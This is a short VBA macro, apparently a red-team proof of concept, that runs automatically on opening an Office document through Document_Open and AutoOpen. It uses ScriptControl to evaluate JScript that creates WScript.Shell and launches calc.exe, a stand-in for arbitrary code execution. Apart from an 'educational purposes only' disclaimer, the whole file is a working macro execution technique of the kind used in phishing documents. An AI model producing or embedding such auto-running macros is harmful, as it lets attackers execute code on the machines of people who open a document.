' ===============================================
' Author: Maerih
' Disclaimer: This code is for educational purposes only
' Use only in authorized testing environments
' ===============================================

Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
Sub MyMacro()
    ' Method 3: DotNetToJScript style COM approach
    Dim sc As Object
    Set sc = CreateObject("ScriptControl")
    sc.Language = "JScript"
    sc.Eval "new ActiveXObject('WScript.Shell').Run('calc.exe',1,false);"
End Sub
